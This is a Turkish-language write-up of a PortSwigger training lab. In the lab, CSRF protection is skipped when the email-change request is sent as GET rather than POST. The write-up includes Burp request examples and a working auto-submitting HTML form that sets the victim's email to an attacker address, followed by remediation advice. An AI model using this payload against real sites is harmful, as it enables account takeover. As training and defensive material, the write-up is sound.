# CSRF Where Token Validation Depends on Request Method — Writeup

**Platform:** PortSwigger Web Security Academy
**Tarih:** 2026-11-04

---

## Executive Summary

- **Hedef:** `https://<lab-id>.web-security-academy.net/` (PortSwigger lab)
- **Zorluk:** Orta (Practitioner)
- **Tespit Edilen Zafiyet:** CSRF — CSRF token yalnızca POST isteklerinde doğrulanıyor, GET isteklerinde doğrulama atlanıyor
- **Genel Etki:** Saldırgan, isteği GET'e çevirerek token kontrolünü tamamen atlayıp kurbanın e-postasını değiştirebilir
- **Durum:** Tamamlandı — token'sız GET exploit'i teslim edildi, kurbanın e-postası değişti, lab çözüldü

---

## Reconnaissance & Enumeration

E-posta değiştirme işlemi normalde POST ile ve geçerli bir CSRF token ile yapılıyor:

```
POST /my-account/change-email HTTP/1.1
Host: <lab-id>.web-security-academy.net
Cookie: session=...
Content-Type: application/x-www-form-urlencoded

email=test@test.com&csrf=<token>
```

Yani savunma var: body'de bir `csrf` token mevcut. Doğrudan CSRF (no defenses tarzı) burada çalışmaz — token gerekli.

---

## Vulnerability Analysis

- **Zafiyet:** Request method'a bağlı, tutarsız CSRF token doğrulaması
- **Teknik Mantık:** Uygulama CSRF token'ı **POST** isteklerinde doğruluyor, ancak istek **GET** metoduyla gönderildiğinde token kontrolünü **atlıyor.** Bu, savunmanın metoda bağlı (method-dependent) ve tutarsız olmasından kaynaklanıyor.
- **Sonuç:** Saldırgan, isteği POST → GET'e çevirip token'ı tamamen kaldırarak işlemi token olmadan çalıştırabilir. Geçerli token'a sahip olmaya gerek kalmaz (ki saldırgan kurbanın token'ını zaten bilemez).

---

## Exploitation

### 1. Doğrulama (Burp Repeater)

POST isteği Repeater'a alındı ve:
1. **"Change request method"** ile GET'e çevrildi (parametreler query string'e taşındı)
2. `csrf` parametresi **tamamen silindi**
3. E-posta farklı bir değere ayarlandı (gözlemlenebilirlik için `test3@test.com`)
4. Gönderildi → e-posta **token olmadan** başarıyla değişti

Bu, GET isteklerinde token doğrulamasının atlandığını kanıtladı:

```
GET /my-account/change-email?email=test3@test.com HTTP/1.1
Host: <lab-id>.web-security-academy.net
Cookie: session=...
```
(token yok, yine de kabul edildi)

### 2. Exploit (GET tabanlı, token'sız)

```html
<form action="https://<lab-id>.web-security-academy.net/my-account/change-email" method="GET">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```

Tek kritik fark: `method="GET"` ve **token yok.** Form GET ile submit olunca `email` parametresi URL'e gider, uygulama GET gördüğü için token aramaz.

### 3. Teslimat

Exploit server'a yüklendi (File: `/exploit`, Head: `HTTP/1.1 200 OK` + `Content-Type: text/html`), **Store** → **Deliver to victim** → kurbanın e-postası değişti → **lab çözüldü.**

---

## Remediation (Çözüm Önerileri)

- **Tüm metotlarda tutarlı doğrulama:** CSRF token her state-değiştiren istekte, metottan bağımsız olarak doğrulanmalı. POST'ta kontrol edip GET'te atlamak, savunmayı anlamsız kılar.
- **State-değiştiren işlemleri GET ile yapma:** GET istekleri idempotent/okuma amaçlı olmalı. E-posta değiştirme gibi işlemler GET ile hiç kabul edilmemeli (hem CSRF hem semantik açıdan yanlış).
- **SameSite cookie + token birlikte:** Defense in depth.

---

## Gotchas (Dikkat Edilecekler)

- **Token EKLEMEYE çalışma — bu lab token'ı ATLATMAKLA ilgili.** Saldırgan geçerli token'ı zaten bilemez (SOP). Çözüm, token kontrolünün atlandığı metodu (GET) kullanmak.
- **Burp'te "Change request method"** POST↔GET dönüşümünü otomatik yapar; parametreleri doğru yere (query string) taşır. Elle dönüştürmekten daha güvenli.
- **GET'e çevirdikten sonra token'ı sil.** Token kalırsa da çalışabilir ama asıl test, token olmadan geçtiğini görmek.
- **Test değeri ≠ saldırı değeri (tekrar!):** Gözlemlenebilirlik için her denemede farklı/sayaçlı e-posta (`test1`, `test2`, `test3`...). Aynı değeri kullanmak "değişti mi?" sorusunu belirsizleştirir.
- **Form action'ı eksiksiz ve doğru olmalı:**
  - `https://` → `:` + **iki** slash (`://`). Bozuksa tarayıcı "server at https" hatası verir.
  - `<lab-id>` placeholder'ı **gerçek** lab subdomain'i ile değiştirilmeli; `<` `>` karakterleri kalmamalı.
  - En güvenlisi: URL'i Repeater'daki çalışan istekten kopyala, elle yazma.

---

## Kavramsal Not: "Method-dependent" zafiyet sınıfı

Bu lab, daha geniş bir zafiyet deseninin örneği: **aynı işlevin farklı HTTP metotlarında farklı güvenlik kontrollerine tabi olması.** Benzer desenler:
- Token POST'ta kontrol edilir, GET'te edilmez (bu lab)
- Yetki kontrolü GET'te var, POST/PUT'ta yok
- Rate limit bir metotta var, diğerinde yok

Genel ders: Bir savunma gördüğünde, **"aynı işlem başka bir metotla yapılabilir mi ve o metotta kontrol aynı mı?"** diye sor. Tutarsızlık, bypass'ın saklandığı yerdir.
